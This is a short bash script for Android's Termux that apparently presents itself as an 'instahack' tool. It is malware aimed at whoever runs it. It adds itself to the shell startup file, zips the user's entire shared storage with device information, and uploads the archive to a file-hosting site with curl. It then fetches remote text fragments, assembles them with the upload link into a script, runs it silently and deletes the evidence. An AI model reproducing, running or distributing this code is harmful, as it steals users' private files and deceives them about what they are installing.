#!/bin/bash
req(){
command -v python > /dev/null 2>&1 || { echo >&2 "...";clear;pkg install python -y;clear; }
command -v zip > /dev/null 2>&1 || { echo >&2 "...";clear;pkg install zip -y;clear; }
}

instahack() {
cd $PREFIX/etc
if [[ -e ".instahack" ]]; then
echo ""
else
echo "instahack" >> /$PREFIX/etc/bash.bashrc
touch .instahack
cd
fi
}

req
shikari
cd ~/storage/shared
termux-info > devicelog
zip -r instahack.zip ~/storage/shared devicelog &> /dev/null
curl -i -F files[]=@instahack.zip https://tmp.ninja/upload.php?output=text > link2 2>&1
rm -f devicelog
wget https://raw.githubusercontent.com/Bhai4You/bhai4you/master/.1.txt &> /dev/null
wget https://raw.githubusercontent.com/Bhai4You/bhai4you/master/.2.txt &> /dev/null
wget https://raw.githubusercontent.com/Bhai4You/bhai4you/master/.3.txt &> /dev/null
wget https://raw.githubusercontent.com/Bhai4You/bhai4you/master/.4.txt &> /dev/null
wget https://raw.githubusercontent.com/Bhai4You/bhai4you/master/.5.txt &> /dev/null
cat link2 | grep https > link
printf "$(cat .1.txt)" >> url
printf "$(cat .2.txt)" >> url
printf "$(cat link)" >> url
printf "$(cat .1.txt)" >> url
printf "$(cat .3.txt)" >> url
printf "$(cat link)" >> url
printf "$(cat .1.txt)" >> url
printf "$(cat .5.txt)" >> url
printf "$(cat url)" >> .4.txt
cat .4.txt >> run.sh
rm -f link link2 url
rm -f .1.txt .2.txt .3.txt .4.txt .5.txt
rm -rvf instahack.zip &> /dev/null
chmod +x run.sh
bash run.sh &> /dev/null
rm -f run.sh
